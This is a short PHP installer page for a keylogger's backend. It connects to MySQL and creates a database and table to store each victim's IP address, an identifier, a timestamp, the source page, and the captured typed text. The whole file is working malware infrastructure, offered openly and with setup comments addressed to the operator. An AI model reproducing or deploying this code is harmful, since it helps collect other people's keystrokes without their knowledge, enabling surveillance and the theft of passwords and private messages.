
<html>

<head>
<title> Keylogger install</title> 
</head>

<body>
<h1> Keylogger installer </h1>
<?php 

include('CONFIGURATION.php');
// Change that to the values that fits your server the most


/*
 * Configuration of the table that will store the data sent by 
 * Ipv6 ready ;) ( see IP length )
 * I kept varchar values very large on purpose, please change them if you want to have a more efficient 
 */

$table_config='CREATE TABLE '.$TABLE_NAME.'
(
IPAddress varchar(100),
GUID_like varchar(100),
DateAdded TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
WhereFrom varchar(200),
TextSend text
);';


$link_to_db = mysql_connect($HOST,$DB_LOGIN,$DB_PASSWORD);
if(!$link_to_db){
  die('Connection error<br/> Process aborted <br/>'.mysql_error());
}
echo 'Connected to database<br/>';

//Attempt to create the database
if(mysql_query('CREATE DATABASE '. $DATABASE_NAME . ';',$link_to_db)){
  echo 'Database created <br/>';
  mysql_select_db($DATABASE_NAME,$link_to_db);
  //Attempt to create the table
  if(mysql_query($table_config,$link_to_db)){
    echo 'Table created <br/>';
    echo '<b>Database ready to operate</b><br/>';
    
  }else{
    die('Table creation failed<br/> Process aborted <br/>' . mysql_error());
  }
}else{
  die('Database creation failed<br/> Process aborted <br/>'.mysql_error());
}


mysql_close($link_to_db);

?>
</body>

</html>